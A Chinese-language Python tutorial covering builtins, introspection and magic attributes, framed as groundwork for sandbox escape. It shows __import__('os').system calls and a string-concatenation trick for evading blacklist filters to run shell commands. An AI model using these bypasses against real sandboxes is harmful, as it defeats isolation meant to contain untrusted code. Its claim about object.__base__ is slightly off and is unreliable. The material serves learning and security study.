<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 print 的行为</span></span><br><span class="line"><span class="built_in">print</span> = <span class="keyword">lambda</span> *args, **kwargs: builtins.<span class="built_in">print</span>(<span class="string">&quot;【DEBUG】&quot;</span>, *args, **kwargs)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello&quot;</span>)  <span class="comment"># 输出： 【DEBUG】 Hello</span></span><br></pre></td></tr></table></figure></div>

<h4 id="控制可用的内置函数"><a href="#控制可用的内置函数" class="headerlink" title="控制可用的内置函数"></a>控制可用的内置函数</h4><p>在使用 <code>eval()</code> 或 <code>exec()</code> 动态执行代码时，可以通过设置全局字典中的 <code>__builtins__</code> 项，<strong>控制哪些内置函数可用或完全禁用内置功能</strong>。</p>
<p>这是一种用于 <strong>沙箱（sandbox）安全隔离</strong>、<strong>限制运行环境</strong> 的技巧，常用于执行用户提供的代码但限制其权限。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">code = <span class="string">&quot;print(&#x27;hello&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(code, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;)  <span class="comment"># ⛔ 报错：name &#x27;print&#x27; is not defined</span></span><br></pre></td></tr></table></figure></div>

<h2 id="内省机制（Introspection）"><a href="#内省机制（Introspection）" class="headerlink" title="内省机制（Introspection）"></a>内省机制（Introspection）</h2><p>Python 的 <strong>内省机制（Introspection）</strong> 是指程序在 <strong>运行时</strong> 可以检查<strong>对象</strong>的<strong>类型、属性、结构、方法</strong>等信息的能力。这也是 Python 被称为“动态语言”或“高度自省语言”的一个重要原因。</p>
<h3 id="对象的类型-结构"><a href="#对象的类型-结构" class="headerlink" title="对象的类型&#x2F;结构"></a>对象的类型&#x2F;结构</h3><table>
<thead>
<tr>
<th>工具&#x2F;函数</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>type(obj)</code></td>
<td>返回对象的类型</td>
</tr>
<tr>
<td><code>id(obj)</code></td>
<td>返回对象的内存地址（唯一标识）</td>
</tr>
<tr>
<td><code>isinstance(obj, T)</code></td>
<td>判断对象是否为某类或其子类</td>
</tr>
<tr>
<td><code>issubclass(A, B)</code></td>
<td>判断类 A 是否是类 B 的子类</td>
</tr>
<tr>
<td><code>callable(obj)</code></td>
<td>判断对象是否可调用（函数&#x2F;类等）</td>
</tr>
</tbody></table>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="string">&quot;hello&quot;</span>))         <span class="comment"># &lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(<span class="number">123</span>, <span class="built_in">int</span>))  <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">callable</span>(<span class="built_in">len</span>))         <span class="comment"># True</span></span><br></pre></td></tr></table></figure></div>

<h3 id="获取对象成员"><a href="#获取对象成员" class="headerlink" title="获取对象成员"></a>获取对象成员</h3><table>
<thead>
<tr>
<th>工具&#x2F;函数</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>dir(obj)</code></td>
<td>列出对象的所有属性和方法名</td>
</tr>
<tr>
<td><code>hasattr(obj, name)</code></td>
<td>判断是否有属性</td>
</tr>
<tr>
<td><code>getattr(obj, name)</code></td>
<td>动态获取属性</td>
</tr>
<tr>
<td><code>setattr(obj, name, value)</code></td>
<td>设置属性值</td>
</tr>
<tr>
<td><code>delattr(obj, name)</code></td>
<td>删除属性</td>
</tr>
</tbody></table>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>): <span class="variable language_">self</span>.name = <span class="string">&quot;Tom&quot;</span></span><br><span class="line"></span><br><span class="line">p = Person()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(p))                 <span class="comment"># 所有方法和属性</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hasattr</span>(p, <span class="string">&#x27;name&#x27;</span>))     <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">getattr</span>(p, <span class="string">&#x27;name&#x27;</span>))     <span class="comment"># &quot;Tom&quot;</span></span><br><span class="line"><span class="built_in">setattr</span>(p, <span class="string">&#x27;age&#x27;</span>, <span class="number">18</span>)</span><br><span class="line"><span class="built_in">print</span>(p.age)                  <span class="comment"># 18</span></span><br></pre></td></tr></table></figure></div>

<h3 id="命名空间与作用域"><a href="#命名空间与作用域" class="headerlink" title="命名空间与作用域"></a>命名空间与作用域</h3><table>
<thead>
<tr>
<th>工具&#x2F;函数</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>globals()</code></td>
<td>返回当前模块的全局变量字典（可读写）</td>
</tr>
<tr>
<td><code>locals()</code></td>
<td>返回当前局部作用域的变量字典（只读&#x2F;只写）</td>
</tr>
<tr>
<td><code>vars([obj])</code></td>
<td>返回对象的 <code>__dict__</code>，或当前局部变量字典</td>
</tr>
</tbody></table>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    y = <span class="number">20</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;globals:&quot;</span>, <span class="built_in">globals</span>().keys())  <span class="comment"># 包括 x、func 等</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;locals:&quot;</span>, <span class="built_in">locals</span>().keys())    <span class="comment"># 只有 y</span></span><br><span class="line"></span><br><span class="line">func()</span><br></pre></td></tr></table></figure></div>

<h3 id="文档与帮助"><a href="#文档与帮助" class="headerlink" title="文档与帮助"></a>文档与帮助</h3><table>
<thead>
<tr>
<th>工具&#x2F;函数</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>help(obj)</code></td>
<td>显示帮助文档（交互式）</td>
</tr>
<tr>
<td><code>obj.__doc__</code></td>
<td>返回对象的 docstring</td>
</tr>
<tr>
<td><code>__annotations__</code></td>
<td>返回类型注解信息</td>
</tr>
</tbody></table>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x: <span class="built_in">int</span>, y: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;加法函数&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(add.__doc__)            <span class="comment"># &quot;加法函数&quot;</span></span><br><span class="line"><span class="built_in">print</span>(add.__annotations__)    <span class="comment"># &#123;&#x27;x&#x27;: int, &#x27;y&#x27;: int, &#x27;return&#x27;: int&#125;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="inspect-模块"><a href="#inspect-模块" class="headerlink" title="inspect 模块"></a>inspect 模块</h3><p><code>inspect</code> 是 Python 标准库中的 introspection 工具集，可用于：</p>
<ul>
<li>函数参数签名分析</li>
<li>获取源码、定义位置、文档</li>
<li>判断对象类型（是否函数、类、方法、生成器等）</li>
</ul>
<table>
<thead>
<tr>
<th>常用函数</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>inspect.getsource(obj)</code></td>
<td>获取对象的源代码</td>
</tr>
<tr>
<td><code>inspect.getdoc(obj)</code></td>
<td>获取对象的 docstring</td>
</tr>
<tr>
<td><code>inspect.signature(func)</code></td>
<td>获取函数的签名信息</td>
</tr>
<tr>
<td><code>inspect.isfunction(obj)</code></td>
<td>是否是函数</td>
</tr>
<tr>
<td><code>inspect.getfile(obj)</code></td>
<td>返回定义对象的源码文件路径</td>
</tr>
<tr>
<td><code>inspect.ismethod(obj)</code></td>
<td>是否是方法（类中定义）</td>
</tr>
<tr>
<td><code>inspect.getmembers(obj)</code></td>
<td>获取成员名和值的元组列表</td>
</tr>
</tbody></table>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">name: <span class="built_in">str</span> = <span class="string">&quot;Tom&quot;</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;打招呼&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;Hello <span class="subst">&#123;name&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(inspect.getsource(greet))         <span class="comment"># 查看源码</span></span><br><span class="line"><span class="built_in">print</span>(inspect.getdoc(greet))            <span class="comment"># 打招呼</span></span><br><span class="line"><span class="built_in">print</span>(inspect.signature(greet))         <span class="comment"># (name: str = &#x27;Tom&#x27;) -&gt; str</span></span><br><span class="line"><span class="built_in">print</span>(inspect.getmembers(greet))        <span class="comment"># 所有成员信息（包括 __code__、__defaults__ 等）</span></span><br></pre></td></tr></table></figure></div>

<h2 id="魔术方法-属性"><a href="#魔术方法-属性" class="headerlink" title="魔术方法 &#x2F; 属性"></a>魔术方法 &#x2F; 属性</h2><p>Python 中以 <code>__xxx__</code> 命名的属性&#x2F;方法被称为魔术方法（magic methods）或魔术属性。它们允许你<strong>自定义对象的行为、重载操作符、控制生命周期和访问机制</strong>等。</p>
<p>在沙箱逃逸、权限绕过、动态执行中，这些方法和属性也能被用作关键入口。</p>
<h3 id="模块-作用域相关"><a href="#模块-作用域相关" class="headerlink" title="模块 &#x2F; 作用域相关"></a>模块 &#x2F; 作用域相关</h3><h4 id="builtins"><a href="#builtins" class="headerlink" title="__builtins__"></a><code>__builtins__</code></h4><p><code>__builtins__</code> 是由 <strong>Python 解释器自动注入</strong>的一个<strong>模块对象</strong>，它在<strong>每个作用域（全局）</strong>中默认存在。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>()</span><br><span class="line">[<span class="string">&#x27;__annotations__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(__builtins__)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;module&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>模块对象本质上是一个<strong>命名空间容器</strong>，其中包含该模块中定义的所有内容，如函数、变量、类等。这里的命名空间容器是指模块对象中的 <code>__dict__</code> 属性，记录了该模块中定义的所有名字与对象的映射。</p>
</blockquote>
<p><code>__builtins__</code> 指向模块 <code>builtins</code>，该模块包含了所有 Python 的内置函数、异常、基本类型等，提供当前作用域中所有内置对象的访问能力。像 <code>print()</code>、<code>len()</code>、<code>open()</code>、<code>Exception</code> 等，都是从 <code>__builtins__</code> 来的（例如 <code>__builtins__.print</code>）。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(__builtins__)</span><br><span class="line">[<span class="string">&#x27;ArithmeticError&#x27;</span>, <span class="string">&#x27;AssertionError&#x27;</span>, <span class="string">&#x27;AttributeError&#x27;</span>, <span class="string">&#x27;BaseException&#x27;</span>, <span class="string">&#x27;BaseExceptionGroup&#x27;</span>, <span class="string">&#x27;BlockingIOError&#x27;</span>, <span class="string">&#x27;BrokenPipeError&#x27;</span>, <span class="string">&#x27;BufferError&#x27;</span>, <span class="string">&#x27;BytesWarning&#x27;</span>, <span class="string">&#x27;ChildProcessError&#x27;</span>, <span class="string">&#x27;ConnectionAbortedError&#x27;</span>, <span class="string">&#x27;ConnectionError&#x27;</span>, <span class="string">&#x27;ConnectionRefusedError&#x27;</span>, <span class="string">&#x27;ConnectionResetError&#x27;</span>, <span class="string">&#x27;DeprecationWarning&#x27;</span>, <span class="string">&#x27;EOFError&#x27;</span>, <span class="string">&#x27;Ellipsis&#x27;</span>, <span class="string">&#x27;EncodingWarning&#x27;</span>, <span class="string">&#x27;EnvironmentError&#x27;</span>, <span class="string">&#x27;Exception&#x27;</span>, <span class="string">&#x27;ExceptionGroup&#x27;</span>, <span class="string">&#x27;False&#x27;</span>, <span class="string">&#x27;FileExistsError&#x27;</span>, <span class="string">&#x27;FileNotFoundError&#x27;</span>, <span class="string">&#x27;FloatingPointError&#x27;</span>, <span class="string">&#x27;FutureWarning&#x27;</span>, <span class="string">&#x27;GeneratorExit&#x27;</span>, <span class="string">&#x27;IOError&#x27;</span>, <span class="string">&#x27;ImportError&#x27;</span>, <span class="string">&#x27;ImportWarning&#x27;</span>, <span class="string">&#x27;IndentationError&#x27;</span>, <span class="string">&#x27;IndexError&#x27;</span>, <span class="string">&#x27;InterruptedError&#x27;</span>, <span class="string">&#x27;IsADirectoryError&#x27;</span>, <span class="string">&#x27;KeyError&#x27;</span>, <span class="string">&#x27;KeyboardInterrupt&#x27;</span>, <span class="string">&#x27;LookupError&#x27;</span>, <span class="string">&#x27;MemoryError&#x27;</span>, <span class="string">&#x27;ModuleNotFoundError&#x27;</span>, <span class="string">&#x27;NameError&#x27;</span>, <span class="string">&#x27;None&#x27;</span>, <span class="string">&#x27;NotADirectoryError&#x27;</span>, <span class="string">&#x27;NotImplemented&#x27;</span>, <span class="string">&#x27;NotImplementedError&#x27;</span>, <span class="string">&#x27;OSError&#x27;</span>, <span class="string">&#x27;OverflowError&#x27;</span>, <span class="string">&#x27;PendingDeprecationWarning&#x27;</span>, <span class="string">&#x27;PermissionError&#x27;</span>, <span class="string">&#x27;ProcessLookupError&#x27;</span>, <span class="string">&#x27;RecursionError&#x27;</span>, <span class="string">&#x27;ReferenceError&#x27;</span>, <span class="string">&#x27;ResourceWarning&#x27;</span>, <span class="string">&#x27;RuntimeError&#x27;</span>, <span class="string">&#x27;RuntimeWarning&#x27;</span>, <span class="string">&#x27;StopAsyncIteration&#x27;</span>, <span class="string">&#x27;StopIteration&#x27;</span>, <span class="string">&#x27;SyntaxError&#x27;</span>, <span class="string">&#x27;SyntaxWarning&#x27;</span>, <span class="string">&#x27;SystemError&#x27;</span>, <span class="string">&#x27;SystemExit&#x27;</span>, <span class="string">&#x27;TabError&#x27;</span>, <span class="string">&#x27;TimeoutError&#x27;</span>, <span class="string">&#x27;True&#x27;</span>, <span class="string">&#x27;TypeError&#x27;</span>, <span class="string">&#x27;UnboundLocalError&#x27;</span>, <span class="string">&#x27;UnicodeDecodeError&#x27;</span>, <span class="string">&#x27;UnicodeEncodeError&#x27;</span>, <span class="string">&#x27;UnicodeError&#x27;</span>, <span class="string">&#x27;UnicodeTranslateError&#x27;</span>, <span class="string">&#x27;UnicodeWarning&#x27;</span>, <span class="string">&#x27;UserWarning&#x27;</span>, <span class="string">&#x27;ValueError&#x27;</span>, <span class="string">&#x27;Warning&#x27;</span>, <span class="string">&#x27;ZeroDivisionError&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;__build_class__&#x27;</span>, <span class="string">&#x27;__debug__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;aiter&#x27;</span>, <span class="string">&#x27;all&#x27;</span>, <span class="string">&#x27;anext&#x27;</span>, <span class="string">&#x27;any&#x27;</span>, <span class="string">&#x27;ascii&#x27;</span>, <span class="string">&#x27;bin&#x27;</span>, <span class="string">&#x27;bool&#x27;</span>, <span class="string">&#x27;breakpoint&#x27;</span>, <span class="string">&#x27;bytearray&#x27;</span>, <span class="string">&#x27;bytes&#x27;</span>, <span class="string">&#x27;callable&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;classmethod&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;complex&#x27;</span>, <span class="string">&#x27;copyright&#x27;</span>, <span class="string">&#x27;credits&#x27;</span>, <span class="string">&#x27;delattr&#x27;</span>, <span class="string">&#x27;dict&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;divmod&#x27;</span>, <span class="string">&#x27;enumerate&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;float&#x27;</span>, <span class="string">&#x27;format&#x27;</span>, <span class="string">&#x27;frozenset&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;hasattr&#x27;</span>, <span class="string">&#x27;hash&#x27;</span>, <span class="string">&#x27;help&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>, <span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;isinstance&#x27;</span>, <span class="string">&#x27;issubclass&#x27;</span>, <span class="string">&#x27;iter&#x27;</span>, <span class="string">&#x27;len&#x27;</span>, <span class="string">&#x27;license&#x27;</span>, <span class="string">&#x27;list&#x27;</span>, <span class="string">&#x27;locals&#x27;</span>, <span class="string">&#x27;map&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;memoryview&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;next&#x27;</span>, <span class="string">&#x27;object&#x27;</span>, <span class="string">&#x27;oct&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;ord&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;property&#x27;</span>, <span class="string">&#x27;quit&#x27;</span>, <span class="string">&#x27;range&#x27;</span>, <span class="string">&#x27;repr&#x27;</span>, <span class="string">&#x27;reversed&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;set&#x27;</span>, <span class="string">&#x27;setattr&#x27;</span>, <span class="string">&#x27;slice&#x27;</span>, <span class="string">&#x27;sorted&#x27;</span>, <span class="string">&#x27;staticmethod&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;sum&#x27;</span>, <span class="string">&#x27;super&#x27;</span>, <span class="string">&#x27;tuple&#x27;</span>, <span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;vars&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<h4 id="import"><a href="#import" class="headerlink" title="__import__"></a><code>__import__</code></h4><p><code>__import__</code> 是 Python 的一个 <strong>内置函数（builtin function）</strong>，它由内置模块 <code>builtins</code> 提供。这个函数是所有 <code>import xxx</code> 语句的底层实现机制。你可以用它在运行时动态地导入模块。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>由于 <code>__import__</code> 可接受 <strong>字符串参数</strong>，因此可以用于 <strong>绕过静态字符串过滤</strong>（如黑名单）：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).system(<span class="string">&#x27;ca&#x27;</span>+<span class="string">&#x27;lc&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p><code>__import__</code> 获取的是模块名称对应的 <strong>模块对象（module object）</strong>。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line">&lt;module <span class="string">&#x27;os&#x27;</span> (frozen)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>))</span><br><span class="line">[<span class="string">&#x27;DirEntry&#x27;</span>, <span class="string">&#x27;F_OK&#x27;</span>, <span class="string">&#x27;MutableMapping&#x27;</span>, <span class="string">&#x27;O_APPEND&#x27;</span>, <span class="string">&#x27;O_BINARY&#x27;</span>, ..., <span class="string">&#x27;walk&#x27;</span>, <span class="string">&#x27;write&#x27;</span>, <span class="string">&#x27;writev&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<h4 id="dict"><a href="#dict" class="headerlink" title="__dict__"></a><code>__dict__</code></h4><p><code>__dict__</code> 是 Python 中的大多数对象（如模块、类、实例、函数等）自带的一个<strong>内省属性</strong>，它以字典形式保存了该对象的<strong>命名空间（namespace）</strong>，也就是这个对象所拥有的所有“<strong>可写属性</strong>”。</p>
<p>这是对象的一个内部属性，底层就是一个字典，记录了对象有哪些属性（包括你手动赋值的变量、函数等）。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__ == <span class="built_in">globals</span>()</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure></div>

<h4 id="class"><a href="#class" class="headerlink" title="__class__"></a><code>__class__</code></h4><p><code>__class__</code> 是<strong>所有 Python 对象</strong>都拥有的一个属性，表示该<strong>对象的类</strong>，也就是<strong>该对象是由哪个类创建的</strong>。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__class__.__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <ul>
<li><p><strong>类</strong> 本身也是一个对象 —— 它是 <code>type</code> 类的实例。所以当我们说“类对象”，就是指：<strong>一个对象，它是通过 <code>type</code> 类构造出来的。</strong></p>
</li>
<li><p><code>type</code> 类本身也是一个对象，它的类还是 <code>type</code>（是自己创建自己的类）。</p>
</li>
<li><p><code>builtins</code> 模块中提供了大量 <strong><code>type</code> 的实例</strong>，也就是我们平时使用的 <strong>内置类型（类）</strong>，例如 <code>str</code>，<code>int</code> 等。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__ == <span class="built_in">str</span></span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure></div></li>
</ul>

    </div>
  </div>

<h4 id="bases"><a href="#bases" class="headerlink" title="__bases__"></a><code>__bases__</code></h4><p><code>__bases__</code> 是<strong>类对象</strong>（类型为 <code>type</code> 的对象）的一个属性，表示该类的<strong>直接父类</strong>（基类）组成的<strong>元组</strong>。另外类对象还有一个 <code>__base__</code> 属性，它返回的是 <strong><code>__bases__</code> 元组的第一个元素</strong>。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>.__bases__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__bases__</span><br><span class="line">()</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <ul>
<li><p>因为 <strong>Python 支持多重继承</strong>，一个类可以有多个父类，所以<code>__bases__</code> 返回的是一个 <strong>元组</strong>。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>: <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>: <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>(A, B): <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(C.__bases__)</span><br><span class="line"><span class="comment"># 输出: (&lt;class &#x27;__main__.A&#x27;&gt;, &lt;class &#x27;__main__.B&#x27;&gt;)</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>所有类最终都继承自 <code>object</code>，因为 <code>object</code> 是 <strong>所有新式类（Python 3 全部是新式类）</strong> 的根基类。而 <code>object.__base__</code> 返回一个空元组 <code>()</code>，说明它没有基类。</p>
</li>
<li></li>
</ul>

    </div>
  </div>

